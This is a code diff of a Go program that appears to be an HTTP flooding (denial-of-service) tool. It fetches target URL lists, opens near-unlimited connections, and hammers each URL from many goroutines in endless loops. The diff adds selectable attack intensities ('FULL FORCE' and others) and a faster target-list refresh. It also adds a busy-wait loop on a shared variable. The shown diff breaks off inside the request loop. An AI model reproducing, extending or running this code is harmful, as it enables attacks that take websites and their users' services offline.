@@ -5,30 +5,70 @@ import (
 	"runtime"
 	"strings"
 	"sync/atomic"
-
 	"time"
 
 	"github.com/gookit/color"
 	"github.com/valyala/fasthttp"
 )
 
-var client = fasthttp.Client{MaxConnsPerHost: 999999}
 var count uint64
 var errors uint64
+var urlsInitial []string
+var multiplier float32
+
+var client = fasthttp.Client{MaxConnsPerHost: 999999}
+var cpus = runtime.NumCPU()
+var firstTime = true
 
 func main() {
-	cpus := runtime.NumCPU()
 	runtime.GOMAXPROCS(cpus)
+	fmt.Println("Select a mode (type in the number): " + color.Red.Render("(1) FULL FORCE ") + color.Yellow.Render("(2) NORMAL ") + color.Green.Render("(3) CHILL"))
+
+	go func() {
+		urlsInitial = getList()
+	}()
+
+	for {
+		var answer string
+		fmt.Scanln(&answer)
+		switch answer {
+		case "1":
+			multiplier = 10
+		case "2":
+			multiplier = 1
+		case "3":
+			multiplier = 0.25
+		}
+
+		if multiplier != 0 {
+			break
+		} else {
+			fmt.Println(color.Red.Render("Invalid code. Try again:"))
+		}
+	}
 
 	startTime := time.Now()
 
-	fmt.Println("Fetching urls...")
-
 	for {
-		nextRefresh := time.Now().Unix() + 3600
-		urls := getList()
+		var urls []string
 
-		for i := 0; i < cpus*10; i++ {
+		if firstTime {
+			firstTime = false
+
+			for {
+				if len(urlsInitial) != 0 {
+					break
+				}
+			}
+
+			urls = urlsInitial
+		} else {
+			urls = getList()
+		}
+
+		nextRefresh := time.Now().Unix() + 20
+
+		for i := 0; i < int(float32(cpus)*multiplier); i++ {
 			for _, url := range urls {
 				go func(url string) {
 					for {
